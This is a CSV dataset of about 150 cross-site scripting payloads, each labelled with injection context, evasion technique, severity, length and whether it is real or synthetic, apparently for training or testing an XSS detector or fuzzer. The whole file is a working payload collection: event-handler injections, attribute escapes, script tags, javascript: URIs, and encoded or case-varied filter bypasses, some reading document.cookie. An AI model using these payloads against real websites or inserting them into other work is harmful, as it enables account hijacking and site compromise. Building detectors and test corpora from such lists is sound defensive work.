payload,context,technique,severity,length,source
""" onmouseenter=prompt(location.hash) """,attribute_escape,synthetic,medium,38,synthetic
"ABC<div style=""x:\x0Dexpression(javascript:alert(4501)"">DEF",js_uri,none,medium,59,real
"<noembed><img title=""</noembed><img src onerror=alert(1)>""></noembed>",event_handler,none,medium,69,real
<font onfocusout=alert(1) tabindex=1 id=x></font><input autofocus>,event_handler,none,medium,66,real
<summary onpointerleave=alert(1) style=display:block>AnonKryptiQuz</summary>,event_handler,none,medium,76,real
"<h1 draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</h1>",event_handler,none,medium,82,real
"javascript:/*--></title></style></template></noscript></noembed></textarea></script><svg/onload='+/""/+/onclick=1/+/[*/[]/+alert()//'>""><svg/onload=`+/""/+/onclick=/+/[*/[]/+alert()//'>""><script>alert()</script><frame src=""javascript:alert()""></frameset>+\""; alert()//<img src onerror=alert()>",script_injection,comment_injection,medium,291,real
<del id=x tabindex=1 ondeactivate=alert(1)></del><input id=y autofocus>,event_handler,none,medium,71,real
""" oNmoUseOveR=aLerT(lOcaTioN.hAsh) """,attribute_escape,synthetic,medium,36,synthetic
<canvas onpointerleave=alert(1) style=display:block>AnonKryptiQuz</canvas>,event_handler,none,medium,74,real
"<div draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</div>",event_handler,none,medium,62,real
"<iframe oncut=""alert(1)"" contenteditable>AnonKryptiQuz</iframe>",event_handler,none,medium,63,real
<hr onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,64,real
' onclick=prompt(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,medium,41,synthetic
"<select onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</select>",event_handler,none,medium,67,real
"<a onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</a>",event_handler,none,medium,63,real
"<content onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</content>",event_handler,none,medium,73,real
"<style>@keyframes x{}</style><button style=""animation-name:x"" onanimationstart=""alert(1)""></button>",event_handler,none,medium,99,real
<svG oNclIck=coNfiRm(LocAtiOn.HasH)/>,tag_injection,synthetic,medium,37,synthetic
"&lt;IMG \""\""\""&gt;&lt;SCRIPT&gt;alert(\""XSS\"")&lt;/SCRIPT&gt;\""&gt;",generic,none,medium,67,real
%22 onload=confirm(%27XSS%27) %22,attribute_escape,synthetic,medium,33,synthetic
%22 onbegin=alert(location.hash) %22,attribute_escape,synthetic,medium,36,synthetic
"<noframes oncut=""alert(1)"" contenteditable>AnonKryptiQuz</noframes>",event_handler,none,medium,67,real
<tfoot onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
' onfocus=console.log('XSS') ',attribute_escape,synthetic,medium,30,synthetic
<body ontouchend=alert(1)>,event_handler,none,medium,26,real
"<a2 onclick=""alert(1)"" style=display:block>AnonKryptiQuz</a2>",event_handler,none,medium,61,real
"<plaintext oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,103,real
%22 onerror=confirm(document.domain) %22,attribute_escape,synthetic,medium,40,synthetic
"data:text/html,<script>alert(0)</script>",script_injection,none,medium,40,real
"<i onclick=""alert(1)"">AnonKryptiQuz</i>",event_handler,none,medium,39,real
"<style>@keyframes x{}</style><area style=""animation-name:x"" onanimationend=""alert(1)""></area>",event_handler,none,medium,93,real
"' onmous&#101;ov&#101;r=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,medium,80,synthetic
"<textarea onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</textarea>",event_handler,none,medium,92,real
<table onpointerout=alert(1) style=display:block>AnonKryptiQuz</table>,event_handler,none,medium,70,real
<meta id=x tabindex=1 onbeforedeactivate=alert(1)></meta><input autofocus>,event_handler,none,medium,74,real
<menuitem onpointerout=alert(1) style=display:block>AnonKryptiQuz</menuitem>,event_handler,none,medium,76,real
"<h1 onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</h1>",event_handler,none,medium,63,real
' ontoggle=console.log(document.domain) ',attribute_escape,synthetic,medium,41,synthetic
"<style>@keyframes slidein {}</style><menuitem style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></menuitem>",event_handler,none,medium,170,real
<scRipT>/*/cOnsOle.loG(dOcuMenT.dOmaIn)</sCriPt>,script_injection,synthetic,medium,48,synthetic
"';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\"";alert(String&#46;fromCharCode(88,83,83))//\\"";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\""&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;",generic,html_entity|encoding,medium,281,real
%22><svg ontoggle=console.log(1)>,tag_injection,synthetic,medium,33,synthetic
"<table oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,98,real
<svg onfocus=alert(1)/>,tag_injection,synthetic,medium,23,synthetic
"<nav onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</nav>",event_handler,none,medium,62,real
<svg onbegin=alert(location.hash)/>,tag_injection,synthetic,medium,35,synthetic
"<style>:target {color:red;}</style><hgroup id=x style=""transition:color 1s"" ontransitionstart=alert(1)></hgroup>",event_handler,none,medium,112,real
"'""><script>alert(2);</script>",script_injection,none,medium,29,real
"<style>:target {color:red;}</style><th id=x style=""transition:color 1s"" ontransitionstart=alert(1)></th>",event_handler,none,medium,104,real
<span id=x tabindex=1 onbeforeactivate=alert(1)></span>,event_handler,none,medium,55,real
"&#101;v&#97;l(""consol&#101;.log('XSS')"")",dom_sink,synthetic,medium,40,synthetic
<svg><small onload=alert(1)></small>,event_handler,none,medium,36,real
"<dir onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</dir>",event_handler,none,medium,67,real
<button popovertarget=x>Click me</button><bdo onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</bdo>,event_handler,none,medium,102,real
"<IMG DYNSRC=""javascript:javascript:alert(1658)"">",js_uri,case_variation,medium,48,real
"<style>:target {transform: rotate(180deg);}</style><samp id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></samp>",event_handler,none,medium,126,real
"<noframes onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</noframes>",event_handler,none,medium,69,real
%27 onmouseover=prompt(1) %27,attribute_escape,synthetic,medium,29,synthetic
"""><input type=""hidden"" oncontentvisibilityautostatechange=""confirm(/Bypassed/)"" style=""content-visibility:auto"">",event_handler,none,medium,112,real
"<div draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</div>",event_handler,none,medium,79,real
“>-setTimeout`\u0028alert(1)\u0029`-’,generic,unicode_escape,medium,37,real
%22><svg onmouseover=alert(location.hash)>,tag_injection,synthetic,medium,42,synthetic
"<section onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</section>",event_handler,none,medium,69,real
<svg onclick=consol&#101;.log(loc&#97;tion.h&#97;sh)/>,tag_injection,synthetic,medium,54,synthetic
javascript:new%20Function`al\ert\`1\``;,js_uri,url_encoding,low,39,real
"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onanimationstart=""alert(1)""></bdi>",event_handler,none,medium,93,real
"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationend=""alert(1)""></element>",event_handler,none,medium,99,real
<frame id=x tabindex=1 onbeforeactivate=alert(1)></frame>,event_handler,none,medium,57,real
"1""><%3Csvg onload=alert%28document.cookie%29>'",event_handler,url_encoding,high,46,real
onclick=”alert(‘AnonKryptiQuz’),event_handler,none,medium,31,real
;alert(1);,generic,none,medium,10,real
<font id=x tabindex=1 onfocus=alert(1)></font>,event_handler,none,medium,46,real
<img src @error=e=$event.path.pop().alert(1)>,tag_injection,none,medium,45,real
"<script>with(document.getElementById(""d""))innerHTML=innerHTML</script>//[""'`-->]]>]</div>",script_injection,none,low,89,real
<scRipT>/*/aLerT(lOcaTioN.hAsh)</ScrIpt>,script_injection,synthetic,medium,40,synthetic
<img src=x onerror=confirm()>,event_handler,none,medium,29,real
"<style>:target {color: red;}</style><embed id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></embed>",event_handler,none,medium,113,real
<svg onmouseenter=prompt(1)/>,tag_injection,synthetic,medium,29,synthetic
<script>javascript:alert(9764)</script\x0B,script_injection,none,medium,42,real
<a2 onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,64,real
"<samp oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</samp>",event_handler,none,medium,60,real
%22%3E%3Cli%20style=list-style:url()%20onerror=javascript:alert(1)%3E%20%3Cdiv%20sty,event_handler,url_encoding,medium,84,real
"""><script+src=""https://m.addthis.com/live/red_lojson/100eng.json?callback=alert(1337)""></script>",script_injection,none,medium,96,real
<strike onpointerover=alert(1) style=display:block>AnonKryptiQuz</strike>,event_handler,none,medium,73,real
"<iframe2 onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</iframe2>",event_handler,none,medium,76,real
%22 onfocus=alert(document.domain) autofocus=%22,attribute_escape,synthetic,medium,48,synthetic
' oNloAd=ConSolE.lOg('XSS') ',attribute_escape,synthetic,medium,29,synthetic
"<select oncontextmenu=""alert(1)"">AnonKryptiQuz</select>",event_handler,none,medium,55,real
<strike onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
%22 onbegin=confirm(document.cookie) %22,attribute_escape,synthetic,medium,40,synthetic
"<style>:target {color: red;}</style><track id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></track>",event_handler,none,medium,113,real
<button popovertarget=x>Click me</button><ruby ontoggle=alert(1) popover id=x>AnonKryptiQuz</ruby>,event_handler,none,medium,98,real
"<style>:target {color: red;}</style><svg id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></svg>",event_handler,none,medium,109,real
<img src=`%00`&NewLine; onerror=alert(7928)&NewLine;,event_handler,url_encoding,medium,52,real
"<hr draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</hr>",event_handler,none,medium,80,real
<ul onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
"<ol onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</ol>",event_handler,none,medium,63,real
"<small onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</small>",event_handler,none,medium,71,real
<svG oNclIck=prOmpT(dOcuMenT.cOokIe)>,tag_injection,synthetic,medium,37,synthetic
<script>alert(123)</script>,script_injection,none,medium,27,real
"""`'><script>\xEF\xBF\xAEjavascript:alert(9603)</script>",script_injection,none,medium,55,real
""">\]<img src=x onerror=alert(document.domain)>",event_handler,none,medium,46,real
<param id=x tabindex=1 onbeforeactivate=alert(1)></param>,event_handler,none,medium,57,real
<caption onpointerup=alert(1) style=display:block>AnonKryptiQuz</caption>,event_handler,none,medium,73,real
<svg ontoggl&#101;=&#97;l&#101;rt(1)/>,tag_injection,synthetic,medium,38,synthetic
<img src=x onerror=prompt(1)>//INJECTX,event_handler,none,medium,38,real
"<picture onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</picture>",event_handler,none,medium,72,real
"<header onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</header>",event_handler,none,medium,73,real
<blockquote onfocusout=alert(1) tabindex=1 id=x></blockquote><input autofocus>,event_handler,none,medium,78,real
"%22 onerror=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,medium,58,synthetic
' oNmoUseEntEr=AleRt('XSS') ',attribute_escape,synthetic,medium,29,synthetic
j&#97;v&#97;script:confirm(1),js_uri,synthetic,medium,29,synthetic
"<form action=""http://subdomain1.portswigger-labs.net/xss/xss.php"" target=""alert(1)""><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" value=""XSS via target in a form""></form>",dom_sink,obfuscation,medium,249,real
<small onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</small><input value=clickme>,event_handler,none,medium,110,real
<button popovertarget=x>Click me</button><plaintext ontoggle=alert(1) popover id=x>AnonKryptiQuz</plaintext>,event_handler,none,medium,108,real
"<menuitem onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</menuitem>",event_handler,none,medium,75,real
"<section onmousedown=""alert(1)"">AnonKryptiQuz</section>",event_handler,none,medium,55,real
/%2527)%253B%2520alert(document.cookies)%253B%252F%252F,dom_sink,url_encoding,high,55,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><spacer id=x style=""position:absolute;"" onanimationcancel=""print()""></spacer>",event_handler,none,low,181,real
"<small draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</small>",event_handler,none,medium,68,real
"<listing onmousedown=""alert(1)"">AnonKryptiQuz</listing>",event_handler,none,medium,55,real
"""><xss/contenteditable/autofocus/onfocus=""alert(1)"">%232%20AnonKryptiQuz</xss>",event_handler,url_encoding,medium,78,real
""" oNtoGglE=pRomPt(1) """,attribute_escape,synthetic,medium,22,synthetic
"<plaintext onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</plaintext>",event_handler,none,medium,73,real
<svg onmous&#101;ov&#101;r=consol&#101;.log(loc&#97;tion.h&#97;sh)/>,tag_injection,synthetic,medium,68,synthetic
"<style>@keyframes slidein {}</style><var style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></var>",event_handler,none,medium,166,real
<b <script>alert(0618)</script>0,script_injection,none,medium,32,real
var{haha:onerror=alert}=0;throw 1,event_handler,none,low,33,real
"<input4 onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</input4>",event_handler,none,medium,71,real
"<param onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</param>",event_handler,none,medium,70,real
"<a href="""" onmousedown=""var name = '&#39;;alert(1)//'; alert('smthg')"">Link</a>",event_handler,html_entity,medium,79,real
%3Cscript%3Econsole.log`'XSS'`%3C/script%3E,script_injection,synthetic,medium,43,synthetic
<keygen onpointermove=alert(1) style=display:block>AnonKryptiQuz</keygen>,event_handler,none,medium,73,real
<strike onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
"<img onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</img>",event_handler,none,medium,65,real
"<a href=""\x0Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
"<thead onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</thead>",event_handler,none,medium,67,real
"<style>@keyframes x{}</style><label style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></label>",event_handler,none,medium,103,real
"<colgroup oncut=""alert(1)"" contenteditable>AnonKryptiQuz</colgroup>",event_handler,none,medium,67,real
"<style>@keyframes x{}</style><param style=""animation-name:x"" onwebkitanimationend=""alert(1)""></param>",event_handler,none,medium,101,real
' oNtoGglE=cOnfIrm(doCumEnt.coOkiE) ',attribute_escape,synthetic,medium,37,synthetic
"<style>@keyframes x{}</style><font style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></font>",event_handler,none,medium,101,real
<article onfocusout=alert(1) tabindex=1 id=x></article><input autofocus>,event_handler,none,medium,72,real
"<script>console.log(""Test XSS from the search bar of page XYZ\n"".concat(document.domain).concat(""\n"").concat(window.origin))</script>",script_injection,none,low,133,real
<datalist id=x tabindex=1 onbeforeactivate=alert(1)></datalist>,event_handler,none,medium,63,real
"<param onmouseenter=""alert(1)"">AnonKryptiQuz</param>",event_handler,none,medium,52,real
"<template onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</template>",event_handler,none,medium,92,real
"<form><input type=search onsearch=alert(1) value=""Hit return"" autofocus>",event_handler,none,medium,72,real
<iframe2 onpointerenter=alert(1) style=display:block>AnonKryptiQuz</iframe2>,event_handler,none,medium,76,real
<svg/onload=location=‘javas’%2B‘cript:’%2B,event_handler,url_encoding,low,42,real
"<html onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</html>",event_handler,none,medium,64,real
